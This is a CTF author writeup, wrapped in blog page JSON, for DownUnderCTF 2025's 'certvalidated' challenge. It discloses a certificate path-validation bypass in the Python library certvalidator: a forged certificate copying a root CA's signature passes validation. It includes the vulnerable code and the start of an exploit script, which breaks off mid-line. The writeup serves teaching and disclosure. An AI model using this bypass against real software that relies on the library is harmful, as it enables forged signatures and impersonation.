{
    "componentChunkName": "component---src-templates-md-blog-post-js",
    "path": "/posts/2025-08-12-downunderctf-2025-certvalidated",
    "result": {"data":{"markdownRemark":{"html":"<p>This is an author writeup of certvalidated from DownUnderCTF 2025. This\nchallenge involved finding and exploiting a 0day vulnerability in the Python\nX.509 library <a href=\"https://github.com/wbond/certvalidator/\">certvalidator</a> (which\nappears to be unmaintained, and the author did not respond to an attempted\nsecurity report).</p>\n<p>I had inaccurately rated this challenge's difficulty as medium, as at the end\nof the CTF there were only two solves.</p>\n<h1>Challenge Overview</h1>\n<p>The following files were provided to players:</p>\n<p><code>Dockerfile</code>:</p>\n<div class=\"gatsby-highlight\" data-language=\"dockerfile\"><pre class=\"language-dockerfile\"><code class=\"language-dockerfile\"><span class=\"token instruction\"><span class=\"token keyword\">FROM</span> ubuntu:22.04</span>\n\n<span class=\"token instruction\"><span class=\"token keyword\">RUN</span> apt-get update <span class=\"token operator\">\\</span>\n    &amp;&amp; apt-get install -y wget socat python3-pip swig <span class=\"token operator\">\\</span>\n    &amp;&amp; rm -r /var/lib/apt/lists/*</span>\n\n<span class=\"token instruction\"><span class=\"token keyword\">RUN</span> pip install endesive==2.18.5</span>\n\n<span class=\"token instruction\"><span class=\"token keyword\">USER</span> 1000</span>\n<span class=\"token instruction\"><span class=\"token keyword\">WORKDIR</span> /home/ctf</span>\n\n<span class=\"token instruction\"><span class=\"token keyword\">COPY</span> ./flag.txt /home/ctf/</span>\n<span class=\"token instruction\"><span class=\"token keyword\">COPY</span> ./root.crt /home/ctf/</span>\n<span class=\"token instruction\"><span class=\"token keyword\">COPY</span> ./certvalidated.py /home/ctf/certvalidated.py</span>\n\n<span class=\"token instruction\"><span class=\"token keyword\">COPY</span> <span class=\"token options\"><span class=\"token property\">--chmod</span><span class=\"token punctuation\">=</span><span class=\"token string\">755</span></span> entrypoint.sh /home/ctf/entrypoint.sh</span>\n<span class=\"token instruction\"><span class=\"token keyword\">ENTRYPOINT</span> [<span class=\"token string\">\"/home/ctf/entrypoint.sh\"</span>]</span></code></pre></div>\n<p><code>certvalidated.py</code>:</p>\n<div class=\"gatsby-highlight\" data-language=\"py\"><pre class=\"language-py\"><code class=\"language-py\"><span class=\"token comment\">#!/usr/bin/env python3</span>\n\n<span class=\"token keyword\">import</span> base64\n<span class=\"token keyword\">from</span> endesive <span class=\"token keyword\">import</span> plain\n\nTO_SIGN <span class=\"token operator\">=</span> <span class=\"token string\">'just a random hex string: af17a1f2654d3d40f532e314c7347cfaf24af12be4b43c5fc95f9fb98ce74601'</span>\nDUCTF_ROOT_CA <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'./root.crt'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'Sign this! &lt;&lt;</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>TO_SIGN<span class=\"token punctuation\">}</span></span><span class=\"token string\">>>'</span></span><span class=\"token punctuation\">)</span>\ncontent_info <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Your CMS blob (base64): '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\nhashok<span class=\"token punctuation\">,</span> signatureok<span class=\"token punctuation\">,</span> certok <span class=\"token operator\">=</span> plain<span class=\"token punctuation\">.</span>verify<span class=\"token punctuation\">(</span>content_info<span class=\"token punctuation\">,</span> TO_SIGN<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>DUCTF_ROOT_CA<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>hashok <span class=\"token operator\">=</span> <span class=\"token punctuation\">}</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>signatureok <span class=\"token operator\">=</span> <span class=\"token punctuation\">}</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>certok <span class=\"token operator\">=</span> <span class=\"token punctuation\">}</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">if</span> <span class=\"token builtin\">all</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>hashok<span class=\"token punctuation\">,</span> signatureok<span class=\"token punctuation\">,</span> certok<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'flag.txt'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></code></pre></div>\n<p><code>entrypoint.sh</code>:</p>\n<div class=\"gatsby-highlight\" data-language=\"sh\"><pre class=\"language-sh\"><code class=\"language-sh\">#!/usr/bin/env bash\nsocat -dd TCP-LISTEN:1337,reuseaddr,fork EXEC:./certvalidated.py</code></pre></div>\n<p><code>root.crt</code>:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">-----BEGIN CERTIFICATE-----\nMIIDgzCCAmugAwIBAgIUe6f2tO34vYWqh/bz8BfNUdZpK8gwDQYJKoZIhvcNAQEL\nBQAwUTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxFTATBgNVBAoM\nDERvd25VbmRlckNURjEWMBQGA1UEAwwNRFVDVEYgUm9vdCBDQTAeFw0yNTA3MDQw\nOTU4MTJaFw0yNjA3MDQwOTU4MTJaMFExCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApT\nb21lLVN0YXRlMRUwEwYDVQQKDAxEb3duVW5kZXJDVEYxFjAUBgNVBAMMDURVQ1RG\nIFJvb3QgQ0EwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDY10s/2DsA\n/1lfdnCiINf4ZZWguWRsdNo8xKZqm3i0hlWudiTVMlhRh8dBYl0YOA4bx06nL6cO\nBT7NEV/wqZUiIcpDgtHAX/+ZWP3p5QM0rmk5nN5b3C8jIpjugjHifmooSCYRBFq9\nhKMYdCsogYPwnINMDJ40MCIYsK54FRKV5PBSoC5bEjJ1KidZoGGKcMsbowTz1Rrz\n4zZiZP4rJTF+uJGLdagpDB/9fN5xkmoTTCU6g2uoSMr0/BE+rxqdDMM42ecdhedM\nmSp1F6yv88gW9vrINEnXUVUVK2EFbN6ljdAK4kPGHCEYKotruuJy66DpYriG1mrX\nZmHS1OZtSCw/AgMBAAGjUzBRMB0GA1UdDgQWBBTQt4qQPkvjMD2aaxDg/BTrl5P/\nizAfBgNVHSMEGDAWgBTQt4qQPkvjMD2aaxDg/BTrl5P/izAPBgNVHRMBAf8EBTAD\nAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQAMqOr/YShwJA0+GQ/GrRHkclNaamDkGNws\nvklbTxMjloMmbMCJW5L0+bgl9c5Rk3Q7fGk8bWZ5mOadr7xQUqjuBHHGoKZ3Y2v/\nQ6XSJ8JAnxIR/+HH+zePmHxOXRFEVdVe1uLlIMJWMu0mtPbvzxRHDH0j4t09dgcL\nwE+de8+cUIa9E2yD/gnnuHl5L9nHWoZPZDu3KTohRfSYAux3sEZpbAnwPwBh7bic\nH5mxH27Bx2SRELIA6NgVi5J3DHbEEUUEVxkgHzu7AoNa8zCgV0s0n/qjmF1U1DND\nZh1EkpMUUAvf1CFRHhlcM3JuqVUoCVuHDtY9fUGHMQbQR7b2dfBo\n-----END CERTIFICATE-----</code></pre></div>\n<p>The server prompts the player for a CMS blob, and then uses\n<a href=\"https://github.com/m32/endesive/\">endesive</a> to verify that it signs the\nchallenge message with a certificate chaining back to the giving root\ncertificate. As of version 2.18.5, endesive used certvalidator for performing\nthe chain validation.</p>\n<p>The challenge revolves around Cryptographic Message Syntax (CMS), so reading\n<a href=\"https://www.rfc-editor.org/rfc/rfc5652\">RFC 5652</a> is highly recommended. In\nsummary, CMS (as used in the challenge) is a PKI standard used to validate that\na message is signed by an entity which is cryptographically tied to some root\nentity (which has some externally established level of trust). These root\nentities are typically embedded in software or operating systems and take the\nform of certificates, which encompass (among other things) a subject name and a\npublic key - the private key of which is held by the corresponding real world\nentity. Some examples include the <a href=\"https://letsencrypt.org/certificates/\">Let's Encrypt ISRG Root X1 certificate</a>\nor <a href=\"https://pki.goog/repository/\">Google's GTS Root R1 certificate</a>.\nThese kinds of certificates are responsible for signing intermediary\ncertificates which themselves can sign more intermediary or leaf certificates\nwhich may then sign messages to be verified by applications. Verification\ntherefore involves building a chain of certificates going from the leaf\ncertificate all the way to a root certificate within the application or\noperating system's store of trusted root certificates.</p>\n<p>CMS is used everywhere, such as in TLS and verifying software on your favourite\nmobile operating systems.</p>\n<h1>Solution <a name=\"solution\"></a></h1>\n<p>Solving the challenge involves finding a vulnerability in the way CMS\nvalidation is performed in the certvalidator library. One such vulnerability is\ngiven below.</p>\n<h2>X.509 certificate path validation bypass in <code>certvalidator</code></h2>\n<p>A path validation bypass in <code>certvalidator</code> was found that affects both the\nrelease on PyPi and the latest commit on GitHub master branch. The bypass\nallows any attacker-provided certificate (which is the expected usage) to have\na path validated against any root CA even if the certificate was never signed\nby the root CA. As an example, the following usage (taken from\n<a href=\"https://github.com/wbond/certvalidator/blob/master/docs/usage.md\">https://github.com/wbond/certvalidator/blob/master/docs/usage.md</a>) is\nvulnerable, assuming the <code>end_entity_cert</code> is untrusted:</p>\n<div class=\"gatsby-highlight\" data-language=\"py\"><pre class=\"language-py\"><code class=\"language-py\"><span class=\"token keyword\">from</span> certvalidator <span class=\"token keyword\">import</span> CertificateValidator<span class=\"token punctuation\">,</span> errors\n\n\n<span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/path/to/cert.crt'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n    end_entity_cert <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n    validator <span class=\"token operator\">=</span> CertificateValidator<span class=\"token punctuation\">(</span>end_entity_cert<span class=\"token punctuation\">)</span>\n    validator<span class=\"token punctuation\">.</span>validate_usage<span class=\"token punctuation\">(</span><span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token string\">'digital_signature'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">except</span> <span class=\"token punctuation\">(</span>errors<span class=\"token punctuation\">.</span>PathValidationError<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token comment\"># The certificate could not be validated</span></code></pre></div>\n<h3>Vulnerability Details</h3>\n<p>The API methods <code>CertificateValidator.validate_tls</code> and\n<code>CertificateValidator.validate_usage</code> both call an internal method which builds\nand validates the path.</p>\n<p>The paths are built by the <code>CertificateRegistry</code> class which may be populated\nwith either the operating system's list of root CAs, a user-provided list, or\nboth. The <code>CertificateRegistry.build_paths</code> method takes a single end-entity\ncertificate and returns a list of possible certificate paths from any of the\ntrusted CAs to the end-entity certificate (optionally going through\nintermediate certificates if provided in the registry).</p>\n<p>The path building is implemented as follows:</p>\n<div class=\"gatsby-highlight\" data-language=\"py\"><pre class=\"language-py\"><code class=\"language-py\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">CertificateRegistry</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token comment\"># ...</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">build_paths</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> end_entity_cert<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token triple-quoted-string string\">\"\"\"\n        Builds a list of ValidationPath objects from a certificate in the\n        operating system trust store to the end-entity certificate\n\n        :param end_entity_cert:\n            A byte string of a DER or PEM-encoded X.509 certificate, or an\n            instance of asn1crypto.x509.Certificate\n\n        :return:\n            A list of certvalidator.path.ValidationPath objects that represent\n            the possible paths from the end-entity certificate to one of the CA\n            certs.\n        \"\"\"</span>\n\n        <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> <span class=\"token builtin\">isinstance</span><span class=\"token punctuation\">(</span>end_entity_cert<span class=\"token punctuation\">,</span> byte_cls<span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> <span class=\"token keyword\">not</span> <span class=\"token builtin\">isinstance</span><span class=\"token punctuation\">(</span>end_entity_cert<span class=\"token punctuation\">,</span> x509<span class=\"token punctuation\">.</span>Certificate<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">raise</span> TypeError<span class=\"token punctuation\">(</span>pretty_message<span class=\"token punctuation\">(</span>\n                <span class=\"token triple-quoted-string string\">'''\n                end_entity_cert must be a byte string or an instance of\n                asn1crypto.x509.Certificate, not %s\n                '''</span><span class=\"token punctuation\">,</span>\n                type_name<span class=\"token punctuation\">(</span>end_entity_cert<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n        <span class=\"token keyword\">if</span> <span class=\"token builtin\">isinstance</span><span class=\"token punctuation\">(</span>end_entity_cert<span class=\"token punctuation\">,</span> byte_cls<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">if</span> pem<span class=\"token punctuation\">.</span>detect<span class=\"token punctuation\">(</span>end_entity_cert<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                _<span class=\"token punctuation\">,</span> _<span class=\"token punctuation\">,</span> end_entity_cert <span class=\"token operator\">=</span> pem<span class=\"token punctuation\">.</span>unarmor<span class=\"token punctuation\">(</span>end_entity_cert<span class=\"token punctuation\">)</span>\n            end_entity_cert <span class=\"token operator\">=</span> x509<span class=\"token punctuation\">.</span>Certificate<span class=\"token punctuation\">.</span>load<span class=\"token punctuation\">(</span>end_entity_cert<span class=\"token punctuation\">)</span>\n\n        path <span class=\"token operator\">=</span> ValidationPath<span class=\"token punctuation\">(</span>end_entity_cert<span class=\"token punctuation\">)</span>\n        paths <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n        failed_paths <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n\n        self<span class=\"token punctuation\">.</span>_walk_issuers<span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">,</span> paths<span class=\"token punctuation\">,</span> failed_paths<span class=\"token punctuation\">)</span> <span class=\"token comment\"># [1]</span>\n\n        <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>paths<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n            cert_name <span class=\"token operator\">=</span> end_entity_cert<span class=\"token punctuation\">.</span>subject<span class=\"token punctuation\">.</span>human_friendly\n            missing_issuer_name <span class=\"token operator\">=</span> failed_paths<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>first<span class=\"token punctuation\">.</span>issuer<span class=\"token punctuation\">.</span>human_friendly\n            <span class=\"token keyword\">raise</span> PathBuildingError<span class=\"token punctuation\">(</span>pretty_message<span class=\"token punctuation\">(</span>\n                <span class=\"token triple-quoted-string string\">'''\n                Unable to build a validation path for the certificate \"%s\" - no\n                issuer matching \"%s\" was found\n                '''</span><span class=\"token punctuation\">,</span>\n                cert_name<span class=\"token punctuation\">,</span>\n                missing_issuer_name\n            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n        <span class=\"token keyword\">return</span> paths\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">_walk_issuers</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> path<span class=\"token punctuation\">,</span> paths<span class=\"token punctuation\">,</span> failed_paths<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token triple-quoted-string string\">\"\"\"\n        Recursively looks through the list of known certificates for the issuer\n        of the certificate specified, stopping once the certificate in question\n        is one contained within the CA certs list\n\n        :param path:\n            A ValidationPath object representing the current traversal of\n            possible paths\n\n        :param paths:\n            A list of completed ValidationPath objects. This is mutated as\n            results are found.\n\n        :param failed_paths:\n            A list of certvalidator.path.ValidationPath objects that failed due\n            to no matching issuer before reaching a certificate from the CA\n            certs list\n        \"\"\"</span>\n\n        <span class=\"token keyword\">if</span> path<span class=\"token punctuation\">.</span>first<span class=\"token punctuation\">.</span>signature <span class=\"token keyword\">in</span> self<span class=\"token punctuation\">.</span>_ca_lookup<span class=\"token punctuation\">:</span> <span class=\"token comment\"># [2]</span>\n            paths<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span>\n\n        new_branches <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n        <span class=\"token keyword\">for</span> issuer <span class=\"token keyword\">in</span> self<span class=\"token punctuation\">.</span>_possible_issuers<span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">.</span>first<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n                self<span class=\"token punctuation\">.</span>_walk_issuers<span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">.</span>copy<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>prepend<span class=\"token punctuation\">(</span>issuer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> paths<span class=\"token punctuation\">,</span> failed_paths<span class=\"token punctuation\">)</span>\n                new_branches <span class=\"token operator\">+=</span> <span class=\"token number\">1</span>\n            <span class=\"token keyword\">except</span> <span class=\"token punctuation\">(</span>DuplicateCertificateError<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">pass</span>\n\n        <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> new_branches<span class=\"token punctuation\">:</span>\n            failed_paths<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">)</span></code></pre></div>\n<p>At <code>[1]</code>, the <code>build_paths</code> method calls the internal <code>_walk_issuers</code> method to\nrecursively populate the <code>paths</code> variable with possible paths. The <code>path</code>\nvariable is initialised to a <code>ValidationPath</code> consisting of just the end-entity\ncertificate since it is reasonably assumed to be part of any possible path.</p>\n<p>Paths built by the <code>_walk_issuers</code> method are such that a certificate's issuer\nappears just before the certificate itself in the list. As a result, the\nrecursive method terminates at the base case when the first element in the path\nis a root CA (and therefore presumably self-issued). This base case is handled\nat <code>[2]</code>, where the check is performed is by checking that the <em>signature</em> of\nthe certificate matches any of the root CAs.</p>\n<p>This check to determine whether the certificate is a root CA is flawed as the\nsignature does not encompass the entirety of the root CA's <code>tbsCertificate</code>\nwhich contains important details about the certificate, including its subject,\npublic key and any extensions. In the main path validation function\n<code>_validate_path</code> defined in <code>validate.py</code>, no cryptographic verifications are\nperformed as the path contains a single certificate which is assumed to be the\n(self-signed) trust anchor (comments <code># ...</code> indicate irrelevant omitted code):</p>\n<div class=\"gatsby-highlight\" data-language=\"py\"><pre class=\"language-py\"><code class=\"language-py\"><span class=\"token keyword\">def</span> <span class=\"token function\">_validate_path</span><span class=\"token punctuation\">(</span>validation_context<span class=\"token punctuation\">,</span> path<span class=\"token punctuation\">,</span> end_entity_name_override<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token triple-quoted-string string\">\"\"\"\n    Internal copy of validate_path() that allows overriding the name of the\n    end-entity certificate as used in exception messages. This functionality is\n    used during chain validation when dealing with indirect CRLs issuer or\n    OCSP responder certificates.\n\n    :param validation_context:\n        A certvalidator.context.ValidationContext object to use for\n        configuring validation behavior\n\n    :param path:\n        A certvalidator.path.ValidationPath object of the path to validate\n\n    :param end_entity_name_override:\n        A unicode string of the name to use for the final certificate in the\n        path. This is necessary when dealing with indirect CRL issuers or\n        OCSP responder certificates.\n\n    :return:\n        The final certificate in the path - an instance of\n        asn1crypto.x509.Certificate\n    \"\"\"</span>\n\n    <span class=\"token comment\"># ...</span>\n\n    trust_anchor <span class=\"token operator\">=</span> path<span class=\"token punctuation\">.</span>first\n\n    <span class=\"token comment\"># We skip the trust anchor when measuring the path since technically</span>\n    <span class=\"token comment\"># the trust anchor is not part of the path</span>\n    path_length <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span>\n\n    <span class=\"token comment\"># ...</span>\n\n    <span class=\"token comment\"># Step 2: basic processing</span>\n    index <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n    last_index <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span>\n\n    completed_path <span class=\"token operator\">=</span> ValidationPath<span class=\"token punctuation\">(</span>trust_anchor<span class=\"token punctuation\">)</span>\n    validation_context<span class=\"token punctuation\">.</span>record_validation<span class=\"token punctuation\">(</span>trust_anchor<span class=\"token punctuation\">,</span> completed_path<span class=\"token punctuation\">)</span>\n\n    cert <span class=\"token operator\">=</span> trust_anchor\n    <span class=\"token keyword\">while</span> index <span class=\"token operator\">&lt;=</span> last_index<span class=\"token punctuation\">:</span>\n        cert <span class=\"token operator\">=</span> path<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span>\n\n        <span class=\"token comment\"># perform signature verification on certificates</span>\n        <span class=\"token comment\"># ...</span>\n\n        index <span class=\"token operator\">+=</span> <span class=\"token number\">1</span>\n\n    <span class=\"token comment\"># ...</span>\n\n    <span class=\"token keyword\">return</span> cert</code></pre></div>\n<p>This results in a scenario where an attacker can provide an end-entity\ncertificate that may bypass path validation (by having its signature field set\nto that of a trusted root CA), despite never having been signed by the root CA.\nAdditionally, any important details contained within the <code>tbsCertificate</code> which\nmay be consumed by an application (such as the certificate's subject, public\nkey and extensions) can be fully controlled.</p>\n<h2>Solution Script</h2>\n<p>So to solve the challenge, we just need to craft a CMS message with the\nsigner's certificate having the same signature as the root certificate:</p>\n<div class=\"gatsby-highlight\" data-language=\"py\"><pre class=\"language-py\"><code class=\"language-py\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> process<span class=\"token punctuation\">,</span> remote\n<span class=\"token keyword\">from</span> base64 <span class=\"token keyword\">import</span> b64encode\n<span class=\"token keyword\">from</span> cryptography <span class=\"token keyword\">import</span> x509\n<span class=\"token keyword\">from</span> cryptography<span class=\"token punctuation\">.</span>hazmat<span class=\"token punctuation\">.</span>primitives <span class=\"token keyword\">import</span> hashes<span class=\"token punctuation\">,</span> serialization\n<span class=\"token keyword\">from</span> cryptography<span class=\"token punctuation\">.</span>hazmat<span class=\"token punctuation\">.</span>primitives<span class=\"token punctuation\">.</span>asymmetric <span class=\"token keyword\">import</span> rsa<span class=\"token punctuation\">,</span> padding\n<span class=\"token keyword\">from</span> cryptography<span class=\"token punctuation\">.</span>x509<span class=\"token punctuation\">.</span>oid <span class=\"token keyword\">import</span> NameOID\n<span class=\"token keyword\">from</span> asn1crypto <span class=\"token keyword\">import</span> cms<span class=\"token punctuation\">,</span> x509 <span class=\"token keyword\">as</span> ax509\n<span class=\"token keyword\">import</span> datetime\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">create_cert</span><span class=\"token punctuation\">(</span>subject<span class=\"token punctuation\">,</span> pubkey<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> issuer<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> issuer_privkey<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    one_day <span class=\"token operator\">=</span> datetime<span class=\"token punctuation\">.</span>timedelta<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>subject<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">:</span>\n        subject <span class=\"token operator\">=</span> x509<span class=\"token punctuation\">.</span>Name<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>x509<span class=\"token punctuation\">.</span>NameAttribute<span class=\"token punctuation\">(</span>NameOID<span class=\"token punctuation\">.</span>COMMON_NAME<span class=\"token punctuation\">,</span> subject<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    private_key <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span>\n    <span class=\"token keyword\">if</span> pubkey <span class=\"token keyword\">is</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span>\n        private_key <span class=\"token operator\">=</span> rsa<span class=\"token punctuation\">.</span>generate_private_key<span class=\"token punctuation\">(</span>\n            public_exponent<span class=\"token operator\">=</span><span class=\"token number\">65537</span><span class=\"token punctuation\">,</span>\n            key_size<span class=\"token operator\">=</span><span class=\"token number\">2048</span><span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">)</span>\n        pubkey <span class=\"token operator\">=</span> private_key<span class=\"token punctuation\">.</span>public_key<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n        <span class=\"token keyword\">if</span> issuer <span class=\"token keyword\">is</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">assert</span> issuer_privkey <span class=\"token keyword\">is</span> <span class=\"token boolean\">None</span>\n            issuer_privkey <span class=\"token operator\">=</span> private_key\n            issuer <span class=\"token operator\">=</span> subject\n\n        <span class=\"token keyword\">if</span> issuer_privkey <span class=\"token keyword\">is</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span>\n            issuer_privkey <span class=\"token operator\">=</span> private_key\n\n    <span class=\"token keyword\">assert</span> issuer <span class=\"token keyword\">is</span> <span class=\"token keyword\">not</span> <span class=\"token boolean\">None</span> <span class=\"token keyword\">and</span> issuer_privkey <span class=\"token keyword\">is</span> <span class=\"token keyword\">not</span> <span class=\"token boolean\">None</span>\n\n    builder <span class=\"token operator\">=</span> x509<span class=\"token punctuation\">.</span>CertificateBuilder<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    builder <span class=\"token operator\">=</span> builder<span class=\"token punctuation\">.</span>subject_name<span class=\"token punctuation\">(</span>subject<span class=\"token punctuation\">)</span>\n    builder <span class=\"token operator\">=</span> builder<span class=\"token punctuation\">.</span>issuer_name<span class=\"token punctuation\">(</span>issuer<span class=\"token punctuation\">)</span>\n    builder <span class=\"token operator\">=</span> builder<span class=\"token punctuation\">.</span>not_valid_before<span class=\"token punctuation\">(</span>datetime<span class=\"token punctuation\">.</span>datetime<span class=\"token punctuation\">.</span>today<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> one_day<span class=\"token punctuation\">)</span>\n    builder <span class=\"token operator\">=</span> builder<span class=\"token punctuation\">.</span>not_valid_after<span class=\"token punctuation\">(</span>datetime<span class=\"token punctuation\">.</span>datetime<span class=\"token punctuation\">.</span>today<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>one_day <span class=\"token operator\">*</span> <span class=\"token number\">30</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    builder <span class=\"token operator\">=</span> builder<span class=\"token punctuation\">.</span>serial_number<span class=\"token punctuation\">(</span>x509<span class=\"token punctuation\">.</span>random_serial_number<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    builder <span class=\"token operator\">=</span> builder<span class=\"token punctuation\">.</span>public_key<span class=\"token punctuation\">(</span>pubkey<span class=\"token punctuation\">)</span>\n    builder <span class=\"token operator\">=</span> builder<span class=\"token 